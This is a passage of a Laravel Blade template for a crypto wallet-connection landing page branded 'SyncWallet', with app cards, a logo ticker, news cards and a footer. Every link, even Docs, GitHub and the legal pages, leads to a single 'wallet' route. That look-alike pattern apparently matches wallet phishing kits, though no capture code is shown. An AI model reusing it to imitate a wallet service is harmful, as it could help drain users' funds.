                            class="styles_image__9dfzG styles_loaded__4M8Ff undefined" loading="lazy" />
                    </button>
                </div>
            </div>
            <div
                class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedLg__2FT1O styles_paddingNone__s1e3U styles_card__aY3PO">
                <div class="styles_cover__FPA9Q">
                    <img alt="Uniswap.  background" src="{{asset('assetB/images/uniswap_bg.9a39fe5e.svg')}}" width="600"
                        height="378" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_coverImage__Kzq6e" loading="lazy" /><img
                        alt="Uniswap.  widget" src="{{asset('assetB/images/uniswap_widget.31a66be9.png')}}" width="1460"
                        height="872" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_widget__DQ3P3" loading="lazy" />
                </div>
                <div class="styles_actions__hTZGw">
                    <img alt="Uniswap.  icon" src="{{asset('assetB/images/uniswap_icon.0cbea3fe.png')}}" width="240"
                        height="240" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__V54nj" loading="lazy" /><a
                        href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"><button
                            class="styles_button__gAHKk styles_fillBlue__7AYTO">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Open</span>
                        </button></a>
                </div>
                <div class="styles_text__YO1jo">
                    <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorGrey__ZiDfp">
                        <span class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU">Uniswap.
                        </span>Swap, earn, and build on the leading decentralized crypto trading
                        protocol.
                    </h4>
                </div>
            </div>
            <div
                class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedLg__2FT1O styles_paddingNone__s1e3U styles_card__aY3PO">
                <div class="styles_cover__FPA9Q">
                    <img alt="Foundation.  background" src="{{asset('assetB/images/foundation_bg.96939fda.svg')}}" width="600"
                        height="378" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_coverImage__Kzq6e" loading="lazy" /><img
                        alt="Foundation.  widget" src="{{asset('assetB/images/foundation_widget.9fe7b81d.png')}}" width="2240"
                        height="1432" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_widget__DQ3P3" loading="lazy" />
                </div>
                <div class="styles_actions__hTZGw">
                    <img alt="Foundation.  icon" src="{{asset('assetB/images/foundation_icon.149c9e24.png')}}" width="240"
                        height="240" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_loaded__4M8Ff styles_icon__V54nj" loading="lazy" /><a
                        href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"><button
                            class="styles_button__gAHKk styles_fillBlue__7AYTO">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Open</span>
                        </button></a>
                </div>
                <div class="styles_text__YO1jo">
                    <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorGrey__ZiDfp">
                        <span class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU">Foundation.
                        </span>Create, collect and sell NFTs.
                    </h4>
                </div>
            </div>
        </section>
        <section class="styles_section__qwzFB">
            <h4 class="styles_heading__YwDIe styles_heading4__h0dFu styles_colorWhite__UuUMU styles_title__N2X5o">
                We connect you with more than 3,000 apps.
            </h4>
            <div class="styles_ticker__ps147">
                <div class="styles_content__dZufc styles_slideToRight__WZrOp">
                    <img alt="/images/aave_icon.png')}}" src="{{asset('assetB/images/aave_icon.png')}}" width="80" height="80" decoding="async"
                        data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy" loading="lazy" /><img
                        alt="/images/uniswap_icon.png')}}" src="{{asset('assetB/images/uniswap_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/opensea_icon.png')}}" src="{{asset('assetB/images/opensea_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/twitter_icon.png')}}" src="{{asset('assetB/images/twitter_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/rarible_icon.png')}}" src="{{asset('assetB/images/rarible_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/compound_icon.png')}}" src="{{asset('assetB/images/compound_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/instagram_icon.png')}}" src="{{asset('assetB/images/instagram_icon.png')}}"
                        width="80" height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_icon__C3eLy" loading="lazy" /><img
                        alt="/images/matcha_icon.png')}}" src="{{asset('assetB/images/matcha_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/foundation_icon.png')}}" src="{{asset('assetB/images/foundation_icon.png')}}"
                        width="80" height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_icon__C3eLy" loading="lazy" /><img
                        alt="/images/mirror_icon.png')}}" src="{{asset('assetB/images/mirror_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/aave_icon.png')}}" src="{{asset('assetB/images/aave_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/uniswap_icon.png')}}" src="{{asset('assetB/images/uniswap_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/opensea_icon.png')}}" src="{{asset('assetB/images/opensea_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/twitter_icon.png')}}" src="{{asset('assetB/images/twitter_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/rarible_icon.png')}}" src="{{asset('assetB/images/rarible_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/compound_icon.png')}}" src="{{asset('assetB/images/compound_icon.png')}}" width="80"
                        height="80" decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/instagram_icon.png')}}" src="{{asset('assetB/images/instagram_icon.png')}}"
                        width="80" height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_icon__C3eLy" loading="lazy" /><img
                        alt="/images/matcha_icon.png')}}" src="{{asset('assetB/images/matcha_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" /><img alt="/images/foundation_icon.png')}}" src="{{asset('assetB/images/foundation_icon.png')}}"
                        width="80" height="80" decoding="async" data-nimg="future"
                        class="styles_image__9dfzG styles_icon__C3eLy" loading="lazy" /><img
                        alt="/images/mirror_icon.png')}}" src="{{asset('assetB/images/mirror_icon.png')}}" width="80" height="80"
                        decoding="async" data-nimg="future" class="styles_image__9dfzG styles_icon__C3eLy"
                        loading="lazy" />
                </div>
            </div>
        </section>
        <section class="styles_section__BNoNS">
            <div class="styles_heading__LWQPJ">
                <h3 class="styles_heading__YwDIe styles_heading3__iwGXC styles_colorWhite__UuUMU">
                    Keep up with our news.
                </h3>
                <div class="styles_headingAction__FFaYH">
                    <button class="styles_button__zk_LZ styles_outlineGrey__sN77O styles_fab__2SH7q">
                        <img alt="Arrow left" src="{{asset('assetB/images/arrow_left_white.f7957bf6.svg')}}" width="7"
                            height="12" decoding="async" data-nimg="future" class="styles_image__9dfzG undefined"
                            loading="lazy" /></button><button
                        class="styles_button__zk_LZ styles_outlineGrey__sN77O styles_fab__2SH7q">
                        <img alt="Arrow right" src="{{asset('assetB/images/arrow_right_white.1e8e5748.svg')}}" width="7"
                            height="12" decoding="async" data-nimg="future"
                            class="styles_image__9dfzG styles_loaded__4M8Ff undefined" loading="lazy" />
                    </button>
                </div>
            </div>
            <div class="use-spring-carousel-main-wrapper" data-testid="use-spring-carousel-wrapper"
                style="display: flex; position: relative; width: 100%; height: 100%">
                <div class="use-spring-carousel-track-wrapper" data-testid="use-spring-carousel-animated-wrapper" style="
              display: flex;
              position: relative;
              touch-action: pan-y;
              flex-direction: row;
              width: calc(100% + 0px);
              height: 100%;
              left: 0px;
              transform: none;
              top: 0px;
            ">
                    <div class="use-spring-carousel-item" data-testid="use-spring-carousel-item-wrapper"
                        style="display: flex; position: relative; margin-right: 20px">
                        <div
                            class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedMd__aAqXZ styles_paddingNone__s1e3U styles_card__Vb79c">
                            <img alt="Introducing: The Web3Inbox SDK"
                                src="https://cdn-images-1.medium.com/max/1024/1*kor2Cby4_om45KYS5GyAag.png')}}" width="320"
                                height="180" decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_thumbnail__1O_CK" loading="lazy" />
                            <h5
                                class="styles_heading__YwDIe styles_heading5__CHcH1 styles_colorWhite__UuUMU styles_cardTitle__J__eo">
                                Introducing: The Web3Inbox SDK
                            </h5>
                            <a href="{{route('wallet')}}" target="_blank"
                                rel="noopener noreferrer"><button
                                    class="styles_button__gAHKk styles_ghost__6zb7F styles_button__UoPq1">
                                    <span
                                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View</span><img
                                        alt="Arrow right blue" src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}"
                                        width="24" height="24" decoding="async" data-nimg="future"
                                        class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                        loading="lazy" /></button></a>
                        </div>
                    </div>
                    <div class="use-spring-carousel-item" data-testid="use-spring-carousel-item-wrapper"
                        style="display: flex; position: relative; margin-right: 20px">
                        <div
                            class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedMd__aAqXZ styles_paddingNone__s1e3U styles_card__Vb79c">
                            <img alt="Activating GemPad’s Seamless Launchpad Experience with Web3Modal"
                                src="https://cdn-images-1.medium.com/max/1024/0*y3q5GTs9V2XxQ6bZ" width="320"
                                height="180" decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_thumbnail__1O_CK" loading="lazy" />
                            <h5
                                class="styles_heading__YwDIe styles_heading5__CHcH1 styles_colorWhite__UuUMU styles_cardTitle__J__eo">
                                Activating GemPad’s Seamless Launchpad Experience with
                                Web3Modal
                            </h5>
                            <a href="{{route('wallet')}}" target="_blank"
                                rel="noopener noreferrer"><button
                                    class="styles_button__gAHKk styles_ghost__6zb7F styles_button__UoPq1">
                                    <span
                                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View</span><img
                                        alt="Arrow right blue" src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}"
                                        width="24" height="24" decoding="async" data-nimg="future"
                                        class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                        loading="lazy" /></button></a>
                        </div>
                    </div>
                    <div class="use-spring-carousel-item" data-testid="use-spring-carousel-item-wrapper"
                        style="display: flex; position: relative; margin-right: 20px">
                        <div
                            class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedMd__aAqXZ styles_paddingNone__s1e3U styles_card__Vb79c">
                            <img alt="CAIP-25 Implementation Guidance: Migrating to Empty / Undefined Required Namespaces"
                                src="https://cdn-images-1.medium.com/max/1024/1*2kq8T_9DsGH_VP4LQa3MKA.png')}}" width="320"
                                height="180" decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_thumbnail__1O_CK" loading="lazy" />
                            <h5
                                class="styles_heading__YwDIe styles_heading5__CHcH1 styles_colorWhite__UuUMU styles_cardTitle__J__eo">
                                CAIP-25 Implementation Guidance: Migrating to Empty /
                                Undefined Required Namespaces
                            </h5>
                            <a href="{{route('wallet')}}" target="_blank"
                                rel="noopener noreferrer"><button
                                    class="styles_button__gAHKk styles_ghost__6zb7F styles_button__UoPq1">
                                    <span
                                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View</span><img
                                        alt="Arrow right blue" src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}"
                                        width="24" height="24" decoding="async" data-nimg="future"
                                        class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                        loading="lazy" /></button></a>
                        </div>
                    </div>
                    <div class="use-spring-carousel-item" data-testid="use-spring-carousel-item-wrapper"
                        style="display: flex; position: relative; margin-right: 20px">
                        <div
                            class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedMd__aAqXZ styles_paddingNone__s1e3U styles_card__Vb79c">
                            <img alt="Web3Modal v3.1: Industry-leading EIP-6963 Support Now Live!"
                                src="https://cdn-images-1.medium.com/max/1024/1*GaUFLroNtN94n0MC1FCmsA.png')}}" width="320"
                                height="180" decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_thumbnail__1O_CK" loading="lazy" />
                            <h5
                                class="styles_heading__YwDIe styles_heading5__CHcH1 styles_colorWhite__UuUMU styles_cardTitle__J__eo">
                                Web3Modal v3.1: Industry-leading EIP-6963 Support Now Live!
                            </h5>
                            <a href="{{route('wallet')}}" target="_blank"
                                rel="noopener noreferrer"><button
                                    class="styles_button__gAHKk styles_ghost__6zb7F styles_button__UoPq1">
                                    <span
                                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View</span><img
                                        alt="Arrow right blue" src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}"
                                        width="24" height="24" decoding="async" data-nimg="future"
                                        class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                        loading="lazy" /></button></a>
                        </div>
                    </div>
                    <div class="use-spring-carousel-item" data-testid="use-spring-carousel-item-wrapper"
                        style="display: flex; position: relative; margin-right: 20px">
                        <div
                            class="styles_card__bfuIs styles_transparent__jKb9d styles_roundedMd__aAqXZ styles_paddingNone__s1e3U styles_card__Vb79c">
                            <img alt="Goodbye, Browser Extension Wallet Wars: EIP-6963 is Now Approved!"
                                src="https://cdn-images-1.medium.com/max/1024/0*g2ZKQ5QpD6cYsijA" width="320"
                                height="180" decoding="async" data-nimg="future"
                                class="styles_image__9dfzG styles_thumbnail__1O_CK" loading="lazy" />
                            <h5
                                class="styles_heading__YwDIe styles_heading5__CHcH1 styles_colorWhite__UuUMU styles_cardTitle__J__eo">
                                Goodbye, Browser Extension Wallet Wars: EIP-6963 is Now
                                Approved!
                            </h5>
                            <a href="{{route('wallet')}}" target="_blank"
                                rel="noopener noreferrer"><button
                                    class="styles_button__gAHKk styles_ghost__6zb7F styles_button__UoPq1">
                                    <span
                                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorBlue__yosSC styles_textIconRight__7obUS">View</span><img
                                        alt="Arrow right blue" src="{{asset('assetB/images/arrow_right_blue.2e2cf95d.svg')}}"
                                        width="24" height="24" decoding="async" data-nimg="future"
                                        class="styles_image__9dfzG styles_loaded__4M8Ff undefined"
                                        loading="lazy" /></button></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer class="styles_footer__4l5bt">
            <img alt="SyncWallet logo mark" src="{{asset('assetB/images/logo_mark.84dd8525.svg')}}" width="144" height="89"
                decoding="async" data-nimg="future" class="styles_image__9dfzG styles_loaded__4M8Ff styles_logo__roRmI"
                loading="lazy" />
            <nav class="styles_navigation__fvQoV">
                <ul class="styles_footerList__0Exe9">
                    <li class="styles_sectionTitle__LOrNT">
                        <span
                            class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">SyncWallet</span>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Products</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Explorer</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Partners</a>
                    </li>
                </ul>
                <ul class="styles_footerList__0Exe9">
                    <li class="styles_sectionTitle__LOrNT">
                        <span
                            class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">Resources</span>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Docs</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">GitHub</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">FAQ</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Status</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Guidelines</a>
                    </li>
                </ul>
                <ul class="styles_footerList__0Exe9">
                    <li class="styles_sectionTitle__LOrNT">
                        <span
                            class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">Company</span>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Blog</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Jobs</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Brand</a>
                    </li>
                </ul>
                <ul class="styles_footerList__0Exe9">
                    <li class="styles_sectionTitle__LOrNT">
                        <span
                            class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">Connect</span>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Twitter</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Discord</a>
                    </li>
                    <li class="styles_linkItem__GnEgT">
                        <a href="{{route('wallet')}}" target="_blank" rel="noopener noreferrer"
                            class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU styles_linkAnchor__KNNxu">Mirror</a>
                    </li>
                </ul>
                <div class="styles_newsLetter__D_So8">
                    <span class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">Our
                        Newsletter</span>
                    <form class="styles_form__YW0Rc undefined">
                        <input placeholder="Email" type="email" required=""
                            class="styles_input__Tm_1o styles_input__HApME" /><button type="submit"
                            class="styles_button__gAHKk styles_outlineGrey__qyVBK">
                            <span
                                class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorWhite__UuUMU">Subscribe</span>
                        </button>
                    </form>
                </div>
            </nav>
            <ul class="styles_legal__KJAle">
                <li>
                    <h6 class="styles_heading__YwDIe styles_heading6__GOm05 styles_colorGrey__ZiDfp">
                        © 2023 SyncWallet, Inc
                    </h6>
                </li>
                <li>
                    <a href="{{route('wallet')}}"
                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorGrey__ZiDfp styles_linkAnchor__KNNxu">Terms
                        of service</a>
                </li>
                <li>
                    <a href="{{route('wallet')}}"
                        class="styles_anchor__OG73y styles_anchor2__5Nde8 styles_colorGrey__ZiDfp styles_linkAnchor__KNNxu">Privacy
                        Policy</a>
                </li>
            </ul>
        </footer>
        <div style="
          position: fixed;
          z-index: 9999;
          top: 16px;
          left: 16px;
          right: 16px;
          bottom: 16px;
          pointer-events: none;
        "></div>
    </div>
</body>

</html>